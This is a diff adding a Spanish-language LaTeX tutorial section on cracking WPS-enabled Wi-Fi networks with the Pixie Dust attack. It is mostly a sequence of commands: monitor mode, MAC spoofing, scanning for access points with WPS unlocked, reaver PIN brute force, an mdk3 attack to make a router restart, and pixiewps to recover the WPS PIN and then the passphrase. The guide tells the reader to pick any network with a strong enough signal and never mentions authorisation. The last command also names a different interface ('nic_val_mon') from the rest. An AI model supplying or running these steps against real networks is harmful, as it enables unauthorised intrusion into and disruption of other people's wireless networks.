@@ -1,0 +1,138 @@
+\section{Cracking de redes wireless con WPS activado}\label{sec:crack-wps}
+% -------------------------------------------------------------------------------------------------------------
+El mejor tutorial que he encontrado hasta la fecha es el que se encuentra en
+\url{https://www.youtube.com/watch?v=FiuKaXIaCNQ}. Usa varios programas en línea de comandos que aprovechan una
+vulnerabilidad que se encontró al estándar WPS. En concreto, aquí se explicará un ataque de este tipo llamado
+\foreignlanguage{english}{Pixie Dust}. Antes, funcionaba muy bien, pero los fabricantes de routers han ido
+actualizándolos para que sea más difícil un ataque de este tipo. Por ejemplo, tras varios intentos seguidos muy
+rápidos de petición de WPS, se bloquea el WPS durante \SI{60}{\sec}. Otra forma, más complicada, de crackear
+redes wifi con seguridad WPA o WPA2 es extrayendo el hash de una passphrase de WPA o WPA2 y haciendo un ataque
+de fuerza bruta. Este último método es mucho más complicado, puesto que las passphrases de los AP wireless
+suelen ser complejas, puesto que las preconfigura el ISP al entregar el router al cliente, y, si éste la cambia,
+es que sabe más o menos cómo crear una clave fuerte, así que un diccionario para hacér más fácil el ataque es
+inútil aquí.
+
+Así, pues, como acabo de explicar, la mejor forma que he encontrado de crackear una red wifi aprovechando que
+no tenga bloqueado el WPS es del modo siguiente. Estoy suponiendo que usted tiene instalada una distribución de
+Linux con el software necesario para el crackeo de wifi. Puede hacerlo instalando Kali Linux o cualquier otra
+distribución con tal de que le pueda instalar las herramientas de software necesarias, que se usan aquí. También
+puede ejecutarla como Live-CD (ya sea, en CD, DVD, pendrive, etc.) o en una máquina virtual.
+
+Lo primero es comprobar sus interfaces wifi:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@ifconfig -a@@
+\end{lstlisting}
+
+\noindent También, con:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@iwconfig@@
+\end{lstlisting}
+
+Ahora deberá ver qué interfaces son aptas para usarlas con Airmon-ng:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@airmon-ng@@
+\end{lstlisting}
+
+Ahora ponga en down la interfaz que desea usar para realizar el ataque, en este caso, será \val{nic\_att}:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@ifconfig !\val{nic\_att}! down@@
+\end{lstlisting}
+
+Ahora matará algunos procesos que pueden entorpecer el comando que va después:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@airmon-ng check kill@@
+\end{lstlisting}
+
+Ahora, ejecutará el comando \lstinline!airmon-ng! sobre \val{nic\_att}:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@airmon-ng start !\val{nic\_att}!@@
+\end{lstlisting}
+
+Ahora vea de nuevo su interfaz wifi:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@iwconfig@@
+\end{lstlisting}
+
+Ahora cambiará la dirección MAC de su interfaz (hará lo que se conoce como MAC spoofing) y pasará su interfaz a
+modo monitor. El MAC spoofing no sé si es necesario en este caso, pues creo que el comando \lstinline!airmon-ng!
+le hace ``invisible'', y pasar al modo monitor, según algunos tutoriales, es algo que debería hacer el comando
+\lstinline!airmon-ng!. Aun así, aquí se hará explícitamente por si acaso:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@ifconfig !\val{nic\_att\_mon}! down@@
+  !\promptr! @@macchanger -r !\val{nic\_att\_mon}!@@
+  !\promptr! @@iwconfig !\val{nic\_att\_mon}! mode monitor@@
+  !\promptr! @@ifconfig !\val{nic\_att\_mon}! up@@
+\end{lstlisting}
+
+Ahora abra dos pestañas de terminal, en cada una de las cuales ejecutará un comando. El primero será para ver
+las redes wifi de las que recibe señal y la potencia de las mismas en \si{\deci\bel m}:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@airodump-ng -i !\val{nic\_att\_mon}!@@
+\end{lstlisting}
+
+En la otra, deberá mostrar (es preferible en otro terminal) las redes de las que recibe señal y si tienen
+bloqueado el WPS:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@wash -i !\val{nic\_att\_mon}! -C@@
+\end{lstlisting}
+
+Seleccione una de la que usted reciba una señal lo bastante potente (\si{\deci\bel m}) y apunte su ESSID, su
+canal y su BSSID (la dirección MAC del router); fíjese también en que bajo la columna \lstinline!WPS locked!
+pone \lstinline!no!.
+
+Ahora introduzca el siguiente comando para que su sistema comience a probar PINs:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@reaver -i !\val{nic\_att\_mon}! -vv -S -b !\val{bssid\_ap}! -c !\val{canal\_ap}!@@
+\end{lstlisting}
+
+Hay veces que funciona mejor añadiéndole la opción \lstinline!-w!:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@reaver -i !\val{nic\_att\_mon}! -vv -S -b !\val{bssid\_ap}! -c !\val{canal\_ap}! -w@@
+\end{lstlisting}
+
+Puede tardar mucho tiempo. Debe tener en cuenta que no le aparecen errores como, por ejemplo, los que tienen
+código 0x02 o 0x03, que hacen que se repita el intento de PIN porque la señal no le llega a usted con la
+suficiente potencia. Advierta que si reintenta siempre el mismo PIN le trae más a cuenta probar con otro punto
+de acceso.
+
+Otra cosa que puede hacer cuando no le funciona bien el ataque es un ataque mdk3 hasta que el router cambie de
+canal o se reinicie:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@mdk3 !\val{nic\_att\_mon}! a -a !\val{bssid\_ap}! -m@@
+\end{lstlisting}
+
+Luego vuelva a lanzar el ataque reaver.
+
+Otra cosa, más evidente, que puede hacer es aumentar la potencia de Tx, si se lo permite su NIC, o usar una
+NIC con mayor recepción (\si{\deci\bel i}, decibelios isotrópicos).
+
+Para hacer el ataque Pixie Dust, basta con que vea que ha obtenido los valores de \val{pke}, \val{pkr},
+\val{e-hash1}, \val{e-hash2}, \val{authkey} y \val{e-nonce}.
+
+Ahora, en otra ventana del emulador de terminal, ejecute:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@pixiewps -e !\val{pke}! -r !\val{pkr}! -s !\val{e-hash1}! \ @@
+  > @@-z !\val{e-hash2}! -a !\val{authkey}! -n !\val{e-nonce}!@@
+\end{lstlisting}
+
+Esto, si se lo permite el punto de acceso que está atacando, debería devolverle el PIN de WPS de dicho punto
+de acceso. Con dicho PIN puede obtenerse la pashphrase del punto de acceso. Para eso deberá introducir:
+
+\begin{lstlisting}[gobble=2,language=bash,style=bashinteract,escapechar=!]
+  !\promptr! @@reaver -i !\val{nic\_val\_mon}! -vv -S -b !\val{bssid\_ap}! \ @@
+  > @@-c !\val{canal\_ap}! --pin=!\val{pin}!@@
+\end{lstlisting}
